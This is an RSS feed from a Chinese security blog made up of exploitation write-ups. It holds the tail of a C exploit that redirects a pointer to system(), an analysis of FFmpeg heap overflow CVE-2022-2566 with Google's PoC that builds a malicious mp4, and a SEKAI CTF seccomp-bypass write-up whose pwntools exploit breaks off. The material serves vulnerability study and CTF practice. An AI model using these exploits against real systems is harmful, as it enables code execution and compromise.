<a class="sourceLine" id="cb14-233" title="233">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-234" title="234">    }</a>
<a class="sourceLine" id="cb14-235" title="235">    set_read(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-236" title="236">    <span class="co">//sleep(3);</span></a>
<a class="sourceLine" id="cb14-237" title="237"></a>
<a class="sourceLine" id="cb14-238" title="238">    <span class="dt">size_t</span> buf_addr = *(<span class="dt">size_t</span>*)(buf1+<span class="bn">0x18</span>)+<span class="bn">0xa00</span>;</a>
<a class="sourceLine" id="cb14-239" title="239">    <span class="dt">size_t</span> t_addr = *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>);</a>
<a class="sourceLine" id="cb14-240" title="240">    printf(<span class="st">&quot;timer_addr: 0x%llx 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, buf_addr, t_addr);</a>
<a class="sourceLine" id="cb14-241" title="241">    <span class="dt">size_t</span> system_plt = t_addr - <span class="bn">0x4dce80</span> + <span class="bn">0x2c2180</span>;</a>
<a class="sourceLine" id="cb14-242" title="242">    printf(<span class="st">&quot;system_plt: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_plt);</a>
<a class="sourceLine" id="cb14-243" title="243"></a>
<a class="sourceLine" id="cb14-244" title="244">    printf(<span class="st">&quot;write ptr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-245" title="245">    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</a>
<a class="sourceLine" id="cb14-246" title="246">        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-247" title="247">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1020</span>;</a>
<a class="sourceLine" id="cb14-248" title="248">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-249" title="249">    }</a>
<a class="sourceLine" id="cb14-250" title="250">    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>) = system_plt;</a>
<a class="sourceLine" id="cb14-251" title="251">    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x18</span>) = buf_addr;</a>
<a class="sourceLine" id="cb14-252" title="252">    <span class="dt">char</span> *command=<span class="st">&quot;cat ./flag</span><span class="sc">\x00</span><span class="st">&quot;</span>;</a>
<a class="sourceLine" id="cb14-253" title="253">    memcpy(buf0,command,strlen(command));</a>
<a class="sourceLine" id="cb14-254" title="254">    printf(<span class="st">&quot;cover system addr</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-255" title="255">    set_read_write(<span class="bn">0x11</span>);</a>
<a class="sourceLine" id="cb14-256" title="256">    printf(<span class="st">&quot;trigger vul</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-257" title="257">    set_read(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-258" title="258">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-259" title="259">}</a></code></pre></div>]]></description>
    <pubDate>Tue, 8 Nov 2022 17:20:42 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Mark's blog]]></title>
    <link>https://blog.mark0519.com/#//#/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/README</guid>
    <description><![CDATA[<h1 id="marks-blog">Mark’s blog</h1>
<blockquote>
<p>Live long and Pwn</p>
</blockquote>
<p>Pwn learner 的互联网自留地</p>
<h2 id="cve-复现分析">CVE 复现&amp;分析</h2>
<ul>
<li><strong>[22/09/29]</strong> <a href="/220929-CVE_2016_5195">CVE-2016-5195</a></li>
<li><strong>[22/10/20]</strong> <a href="/221020-CVE_2022_2566">CVE-2022-2566</a></li>
</ul>]]></description>
    <pubDate>Thu, 20 Oct 2022 16:11:27 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[CVE-2022-2566 分析和复现]]></title>
    <link>https://blog.mark0519.com/#//#/221020-CVE_2022_2566</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/221020-CVE_2022_2566</guid>
    <description><![CDATA[<h1 id="cve-2022-2566-分析和复现">CVE-2022-2566 分析和复现</h1>
<blockquote>
<p>FFmpeg v5.1 堆越界内存写入</p>
</blockquote>
<h2 id="x00-背景">0x00 背景</h2>
<p><code>FFmpeg</code> https://www.ffmpeg.org/</p>
<p>它视频处理最常用的开源软件。它功能强大，用途广泛，大量用于视频网站和商业软件（比如 Youtube 和 iTunes），也是许多音频和视频格式的标准编码/解码实现。</p>
<p>在 <code>libavformat/mov.c</code>中发现了影响 FFmpeg 自 5.1 版或提交 ab77b878f1205225c6de1370fb0e998dbcc8bc69 的堆越界写入。</p>
<p>Google的分析：<a href="https://github.com/google/security-research/security/advisories/GHSA-vhxg-9wfx-7fcj">FFmpeg: Heap Out-Of-Bounds Write in build_open_gop_key_points · Advisory · google/security-research (github.com)</a></p>
<p>该漏洞被定位是高危漏洞（<em>High</em>），攻击者可以通过恶意 mp4 文件导致远程代码执行（RCE）。</p>
<h2 id="x01-漏洞分析">0x01 漏洞分析</h2>
<p>根据CVE描述，可以知道漏洞在 ab77b878f1205225c6de1370fb0e998dbcc8bc69 提交中引入。</p>
<p>而对应的修复commit为：6f53f0d09ea4c9c7f7354f018a87ef840315207d。</p>
<p>对应的修复：</p>
<p><a href="https://github.com/FFmpeg/FFmpeg/commit/6f53f0d09ea4c9c7f7354f018a87ef840315207d">avformat/mov: Check count sums in build_open_gop_key_points() · FFmpeg/FFmpeg@6f53f0d (github.com)</a></p>
<figure>
<img src="https://pic1.imgdb.cn/item/634fc0f416f2c2beb16005d9.png" alt="fix" /><figcaption>fix</figcaption>
</figure>
<p>可以看到关键代码为：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb1-2" title="2">        sc-&gt;sample_offsets_count += sc-&gt;ctts_data[i].count;</a></code></pre></div>
<p>而变量<code>sc-&gt;sample_offsets_count</code>被定义为<code>int</code></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="dt">int</span> sample_offsets_count;</a></code></pre></div>
<p>所以<code>sc-&gt;sample_offsets_count</code>为8字节数，如果最大值超过<code>INT_MAX</code>则会发生整数溢出。</p>
<p>这个整数溢出会影响接下来malloc的申请：</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1">sc-&gt;sample_offsets = av_calloc(sc-&gt;sample_offsets_count, <span class="kw">sizeof</span>(*sc-&gt;sample_offsets));</a></code></pre></div>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="dt">void</span> *av_calloc(<span class="dt">size_t</span> nmemb, <span class="dt">size_t</span> size) av_malloc_attrib av_alloc_size(<span class="dv">1</span>, <span class="dv">2</span>);</a></code></pre></div>
<p><img src="https://pic1.imgdb.cn/item/634ff67a16f2c2beb1bd971d.png" /></p>
<p>如果出现整数溢出导致<code>sc-&gt;sample_offsets_count == 0</code>就会导致<code>av_calloc</code>申请最小的chunk</p>
<p>也就是<code>sc-&gt;sample_offsets</code>会指向一个0x20的chunk</p>
<p>之后会把每个ctts的duration写入这个chunk中：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb5-2" title="2">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</a>
<a class="sourceLine" id="cb5-3" title="3">             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</a></code></pre></div>
<p>如果<code>sc-&gt;ctts_data[i].duration</code>过长，就会产生堆溢出。</p>
<h2 id="x02-poc调试">0x02 POC调试</h2>
<p>这里给出Google安全研究员提供的POC</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1"><span class="co">#!/usr/bin/env python3</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="im">import</span> struct</a>
<a class="sourceLine" id="cb6-3" title="3"><span class="im">import</span> sys</a>
<a class="sourceLine" id="cb6-4" title="4"></a>
<a class="sourceLine" id="cb6-5" title="5">HEVC_NAL_CRA_NUT <span class="op">=</span> <span class="dv">21</span></a>
<a class="sourceLine" id="cb6-6" title="6"></a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8"><span class="kw">def</span> atom(tag, chunk):</a>
<a class="sourceLine" id="cb6-9" title="9">  data <span class="op">=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bu">len</span>(chunk) <span class="op">+</span> <span class="dv">8</span>)</a>
<a class="sourceLine" id="cb6-10" title="10">  data <span class="op">+=</span> tag</a>
<a class="sourceLine" id="cb6-11" title="11">  data <span class="op">+=</span> chunk</a>
<a class="sourceLine" id="cb6-12" title="12">  <span class="cf">return</span> data</a>
<a class="sourceLine" id="cb6-13" title="13"></a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="kw">def</span> atom_ftyp():</a>
<a class="sourceLine" id="cb6-16" title="16">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-17" title="17">  data <span class="op">+=</span> b<span class="st">&#39;mp42&#39;</span>  <span class="co"># type</span></a>
<a class="sourceLine" id="cb6-18" title="18">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;L&#39;</span>, <span class="dv">0</span>)  <span class="co"># minor_ver</span></a>
<a class="sourceLine" id="cb6-19" title="19">  <span class="cf">return</span> atom(b<span class="st">&#39;ftyp&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-20" title="20"></a>
<a class="sourceLine" id="cb6-21" title="21"></a>
<a class="sourceLine" id="cb6-22" title="22"><span class="kw">def</span> atom_moov(nested):</a>
<a class="sourceLine" id="cb6-23" title="23">  <span class="cf">return</span> atom(b<span class="st">&#39;moov&#39;</span>, nested)</a>
<a class="sourceLine" id="cb6-24" title="24"></a>
<a class="sourceLine" id="cb6-25" title="25"></a>
<a class="sourceLine" id="cb6-26" title="26"><span class="kw">def</span> atom_trak(nested):</a>
<a class="sourceLine" id="cb6-27" title="27">  <span class="cf">return</span> atom(b<span class="st">&#39;trak&#39;</span>, nested)</a>
<a class="sourceLine" id="cb6-28" title="28"></a>
<a class="sourceLine" id="cb6-29" title="29"></a>
<a class="sourceLine" id="cb6-30" title="30"><span class="kw">def</span> atom_hev1():</a>
<a class="sourceLine" id="cb6-31" title="31">  <span class="cf">return</span> atom(b<span class="st">&#39;hev1&#39;</span>, b<span class="st">&#39;&#39;</span>)</a>
<a class="sourceLine" id="cb6-32" title="32"></a>
<a class="sourceLine" id="cb6-33" title="33"></a>
<a class="sourceLine" id="cb6-34" title="34"><span class="kw">def</span> atom_stsd(nested):</a>
<a class="sourceLine" id="cb6-35" title="35">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-36" title="36">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-37" title="37">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-38" title="38">  data <span class="op">+=</span> nested</a>
<a class="sourceLine" id="cb6-39" title="39">  data <span class="op">+=</span> b<span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span> <span class="op">*</span> <span class="dv">70</span></a>
<a class="sourceLine" id="cb6-40" title="40">  <span class="cf">return</span> atom(b<span class="st">&#39;stsd&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42"></a>
<a class="sourceLine" id="cb6-43" title="43"><span class="kw">def</span> atom_sgpd():</a>
<a class="sourceLine" id="cb6-44" title="44">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-45" title="45">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-46" title="46">  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></a>
<a class="sourceLine" id="cb6-47" title="47">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># default_length</span></a>
<a class="sourceLine" id="cb6-48" title="48">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entry_count</span></a>
<a class="sourceLine" id="cb6-49" title="49">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-50" title="50">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;B&#39;</span>, HEVC_NAL_CRA_NUT)  <span class="co"># nal_unit_type</span></a>
<a class="sourceLine" id="cb6-51" title="51">  <span class="cf">return</span> atom(b<span class="st">&#39;sgpd&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-52" title="52"></a>
<a class="sourceLine" id="cb6-53" title="53"></a>
<a class="sourceLine" id="cb6-54" title="54"><span class="kw">def</span> atom_sbgp():</a>
<a class="sourceLine" id="cb6-55" title="55">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-56" title="56">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-57" title="57">  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></a>
<a class="sourceLine" id="cb6-58" title="58">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">2</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-59" title="59">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-60" title="60">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># sample_count</span></a>
<a class="sourceLine" id="cb6-61" title="61">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></a>
<a class="sourceLine" id="cb6-62" title="62">  <span class="co"># entry 1</span></a>
<a class="sourceLine" id="cb6-63" title="63">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0xffffffff</span>)  <span class="co"># sample_count</span></a>
<a class="sourceLine" id="cb6-64" title="64">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></a>
<a class="sourceLine" id="cb6-65" title="65">  <span class="cf">return</span> atom(b<span class="st">&#39;sbgp&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-66" title="66"></a>
<a class="sourceLine" id="cb6-67" title="67"></a>
<a class="sourceLine" id="cb6-68" title="68"><span class="kw">def</span> atom_ctts():</a>
<a class="sourceLine" id="cb6-69" title="69">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-70" title="70">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-71" title="71">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">4</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-72" title="72">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-73" title="73">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-74" title="74">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-75" title="75">  <span class="co"># entry 1</span></a>
<a class="sourceLine" id="cb6-76" title="76">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-77" title="77">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-78" title="78">  <span class="co"># entry 2</span></a>
<a class="sourceLine" id="cb6-79" title="79">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-80" title="80">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-81" title="81">  <span class="co"># entry 3</span></a>
<a class="sourceLine" id="cb6-82" title="82">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-83" title="83">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-84" title="84">  <span class="cf">return</span> atom(b<span class="st">&#39;ctts&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-85" title="85"></a>
<a class="sourceLine" id="cb6-86" title="86"></a>
<a class="sourceLine" id="cb6-87" title="87"><span class="kw">def</span> main():</a>
<a class="sourceLine" id="cb6-88" title="88">  <span class="cf">if</span> <span class="bu">len</span>(sys.argv) <span class="op">!=</span> <span class="dv">2</span>:</a>
<a class="sourceLine" id="cb6-89" title="89">    <span class="bu">print</span>(<span class="st">&#39;Usage: poc.py out.mp4&#39;</span>)</a>
<a class="sourceLine" id="cb6-90" title="90">    <span class="cf">return</span> <span class="dv">-1</span></a>
<a class="sourceLine" id="cb6-91" title="91"></a>
<a class="sourceLine" id="cb6-92" title="92">  data <span class="op">=</span> atom_ftyp() <span class="op">+</span> atom_moov(</a>
<a class="sourceLine" id="cb6-93" title="93">      atom_trak(</a>
<a class="sourceLine" id="cb6-94" title="94">          atom_stsd(atom_hev1()) <span class="op">+</span> atom_sgpd() <span class="op">+</span> atom_sbgp()</a>
<a class="sourceLine" id="cb6-95" title="95">          <span class="op">+</span> atom_ctts()</a>
<a class="sourceLine" id="cb6-96" title="96">      ))</a>
<a class="sourceLine" id="cb6-97" title="97"></a>
<a class="sourceLine" id="cb6-98" title="98">  <span class="bu">open</span>(sys.argv[<span class="dv">1</span>], <span class="st">&#39;wb&#39;</span>).write(data)</a>
<a class="sourceLine" id="cb6-99" title="99"></a>
<a class="sourceLine" id="cb6-100" title="100"></a>
<a class="sourceLine" id="cb6-101" title="101"><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</a>
<a class="sourceLine" id="cb6-102" title="102">  main()</a></code></pre></div>
<p>这里可以看到，生成的这个mp4文件中存在4个<code>ctts</code>结构体，每个的count和duration为：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb7-1" title="1">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb7-2" title="2">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a></code></pre></div>
<p>也就是会使得<code>sc-&gt;ctts_data[i].count == 0x40000000</code></p>
<p>而我们一共有4个<code>ctts</code>结构，也就是<code>0x40000000*4 = 0x100000000</code></p>
<p>而<code>INT(0x100000000) == 0</code>，所以这个运行这个poc得到的mp4文件就会使得<code>ffmpeg</code>出现整数溢出问题。</p>
<p>我们编译一份存在漏洞版本的<code>ffmpeg</code>，编译之后得到的二进制文件<code>ffmpeg_g</code>就是有GDB调试符号的程序。</p>
<p>在<code>build_open_gop_key_points()</code>函数打断点：</p>
<p><img src="https://pic1.imgdb.cn/item/634ff85516f2c2beb1c0bf1a.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffd0716f2c2beb1c8b975.png" /></p>
<p>可以看到：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd2116f2c2beb1c8e8e0.png" /></p>
<p>之后运行这个for循环：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd6016f2c2beb1c95a26.png" /></p>
<p>也就是整数溢出使得这个值为0，也就是<code>av_calloc</code>会申请出一个0x20的chunk</p>
<p><img src="https://pic1.imgdb.cn/item/634ffe4116f2c2beb1caf53d.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeac16f2c2beb1cbafe2.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeb516f2c2beb1cbbf45.png" /></p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb8-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb8-2" title="2">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</a>
<a class="sourceLine" id="cb8-3" title="3">             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</a></code></pre></div>
<p>但是由于<code>sc-&gt;ctts_data[i].count == 0x40000000</code>，所以会直接覆盖接下来的<code>0x40000000*4</code>个字节的堆区，产生堆溢出Heap overflow</p>
<h2 id="x03-利用">0x03 利用</h2>
<blockquote>
<p>暂时没有想到好的利用方法，，，，</p>
</blockquote>]]></description>
    <pubDate>Thu, 20 Oct 2022 16:11:27 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[赛题复现]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/README</guid>
    <description><![CDATA[<h1 id="赛题复现">赛题复现</h1>
<blockquote>
<p>青山依旧在，几度夕阳红。</p>
</blockquote>
<h2 id="pwnhub.cn">pwnhub.cn</h2>
<ul>
<li><strong>[22/4/13]</strong> [PWN] <a href="/reproduce/220413-canyouseeme">can_you_see_me</a></li>
</ul>
<h2 id="aaactf2022">AAACTF2022</h2>
<ul>
<li><strong>[22/7/17]</strong> [PWN] <a href="/reproduce/220717-MasterOfDNS">Master of DNS</a></li>
</ul>
<h2 id="space-2022">5Space 2022</h2>
<ul>
<li><strong>[22/9/20]</strong> [PWN] <a href="/reproduce/220920-toolkit">toolkit</a></li>
</ul>
<h2 id="sekai-ctf-2022">SEKAI CTF 2022</h2>
<ul>
<li><strong>[22/10/11]</strong> [PWN] <a href="/reproduce/221011-setup">setup</a></li>
</ul>
<h2 id="其他">其他</h2>
<ul>
<li><p><strong>[22/7/10]</strong> [PWN] <a href="/reproduce/220710-one">one</a></p></li>
<li><p><strong>[22/7/10]</strong> [PWN] <a href="/reproduce/220710-MuteBuild">Mute&amp;Blind</a></p></li>
</ul>]]></description>
    <pubDate>Tue, 11 Oct 2022 16:59:01 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[setup]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/221011-setup</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/221011-setup</guid>
    <description><![CDATA[<h1 id="setup">setup</h1>
<blockquote>
<p>Category: PWN</p>
<p>Date: 2022/10/11</p>
<p>Authorship: SEKAI CTF 2022</p>
</blockquote>
<h2 id="x00-64位下的int-0x80">0x00 64位下的int 0x80</h2>
<p>在64位程序下，使用系统调用的方法是syscall，但是可以直接使用int 0x80来调用32位的系统调用号</p>
<p>比较常见的几个：</p>
<table>
<thead>
<tr class="header">
<th>sys code</th>
<th>x64 (64 bits)</th>
<th>x86 (32 bits)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0x05</td>
<td>fstat</td>
<td>open</td>
</tr>
<tr class="even">
<td>0xc0</td>
<td>lgetxattr</td>
<td>mmap2</td>
</tr>
<tr class="odd">
<td>0x8d</td>
<td>getpriority</td>
<td>getents</td>
</tr>
</tbody>
</table>
<h2 id="x01-题目分析">0x01 题目分析</h2>
<p><img src="https://pic1.imgdb.cn/item/6345308d16f2c2beb13e47f6.png" /></p>
<p>保护全开的栈溢出，绕过canary的方法为直接修改tls里canary的值</p>
<p>之后rop调用mprotect写修改权限然后sys read写shellcode</p>
<p>之后再写的shellcode里利用int 0x80来绕过seccomp白名单</p>
<blockquote>
<p>需要注意的是，这题flag文件名未知，需要调用getents来获得文件名</p>
</blockquote>
<h2 id="x02-exp">0x02 exp</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb1-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb1-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;./libc-2.34.so&#39;</span>)</a>
<a class="sourceLine" id="cb1-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./setup&quot;</span>)</a>
<a class="sourceLine" id="cb1-7" title="7"></a>
<a class="sourceLine" id="cb1-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb1-9" title="9"></a>
<a class="sourceLine" id="cb1-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./setup&quot;</span>)    </a>
<a class="sourceLine" id="cb1-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb1-14" title="14"></a>
<a class="sourceLine" id="cb1-15" title="15"><span class="kw">def</span> debug(p,cmd<span class="op">=</span><span class="st">&quot;&quot;</span>):</a>
<a class="sourceLine" id="cb1-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-17" title="17">        gdb.attach(p,cmd)</a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb1-20" title="20"></a>
<a class="sourceLine" id="cb1-21" title="21"></a>
<a class="sourceLine" id="cb1-22" title="22">p.sendlineafter(<span class="st">&quot;&gt;&quot;</span>, <span class="st">&quot;1&quot;</span>)</a>
<a class="sourceLine" id="cb1-23" title="23">p.sendlineafter(<span class="st">&quot;to:&quot;</span>, <span class="st">&quot;a&quot;</span><span class="op">*</span><span class="bn">0x18</span>)</a>
<a class="sourceLine" id="cb1-24" title="24">p.sendlineafter(<span class="st">&quot;&gt;&quot;</span>, <span class="st">&quot;1&quot;</span>)</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26">p.recvuntil(<span class="st">&quot;a&quot;</span><span class="op">*</span><span class="bn">0x18</span>)</a>
<a class="sourceLine" id="cb1-27" title="27">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x22aa0a</span></a>
<a class="sourceLine" id="cb1-28" title="28">log.info(<span class="st">&quot;libc_base ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(libc.address))</a>
<a class="sourceLine" id="cb1-29" title="29">tls_canary <span class="op">=</span> libc.address <span class="op">-</span> <span class="bn">0x2898</span></a>
<a class="sourceLine" id="cb1-30" title="30">log.info(<span class="st">&quot;tls_canary ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(tls_canary))</a>
<a class="sourceLine" id="cb1-31" title="31">pop_rax <span class="op">=</span> <span class="bn">0x0000000000049f10</span> <span class="op">+</span> libc.address</a>
